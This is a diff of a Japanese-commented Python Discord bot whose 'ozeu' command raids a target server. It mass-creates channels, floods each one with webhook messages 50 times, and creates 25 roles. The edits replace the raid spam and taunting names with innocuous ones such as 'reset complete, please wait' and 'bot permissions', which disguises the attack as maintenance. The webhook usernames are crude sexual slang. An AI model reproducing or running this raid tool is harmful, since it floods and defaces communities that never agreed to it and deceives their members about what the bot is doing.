@@ -8,7 +8,7 @@ from dotenv import load_dotenv
 
 load_dotenv()
 TOKEN = os.getenv("DISCORD_TOKEN")
-SPAM_MESSAGE = "discord.gg/ozeu　https://i.imgur.com/NbBGFcf.mp4  [gif](https://media.discordapp.net/attachments/...)  [gif](https://media.discordapp.net/attachments/...) @everyone"
+SPAM_MESSAGE = "こんにちは"
 
 OWNER_ID = 1386539010381451356  # あなたのDiscord ID
 
@@ -76,7 +76,7 @@ async def ozeu(ctx, guild_id: int):
     # --- 新規チャンネル作成 ---
     async def create_channel(index):
         try:
-            ch = await guild.create_text_channel(name="荒らされてやんのｗｗｗ")
+            ch = await guild.create_text_channel(name="リセット完了　もうしばらくお待ち下さい")
             return ch
         except Exception as e:
             print(f"{index + 1}個目のチャンネル作成失敗: {e}")
@@ -87,23 +87,22 @@ async def ozeu(ctx, guild_id: int):
     created_channels = [ch for ch in created_channels if ch is not None]
 
     # --- Webhook送信 ---
-     async def send_with_webhook(channel):
+    async def send_with_webhook(channel):
         try:
-            webhook = await channel.create_webhook(name="ozeuWebhook")
+            webhook = await channel.create_webhook(name="ZPlusWebhook")
             for _ in range(50):
-                await webhook.send(SPAM_MESSAGE, username="イクイク")
+                await webhook.send(SPAM_MESSAGE, username="ガバマン")
         except Exception as e:
             print(f"{channel.name} のWebhook送信でエラー: {e}")
 
     webhook_tasks = [send_with_webhook(ch) for ch in created_channels]
     await asyncio.gather(*webhook_tasks)
 
-
     # --- ロール作成 ---
     try:
         for i in range(25):
-            await guild.create_role(name=f"ozeu植民地{i+1}")
-            print(f"ロール『ozeu植民地{i+1}』を作成しました。")
+            await guild.create_role(name=f"bot用権限{i+1}")
+            print(f"ロール『bot用権限{i+1}』を作成しました。")
     except Exception as e:
         print(f"ロール作成でエラー: {e}")
 
@@ -258,3 +257,5 @@ async def servers(interaction: discord.Interaction):
     await interaction.response.send_message(embed=embed, ephemeral=True)
 
 bot.run(TOKEN)
+
+
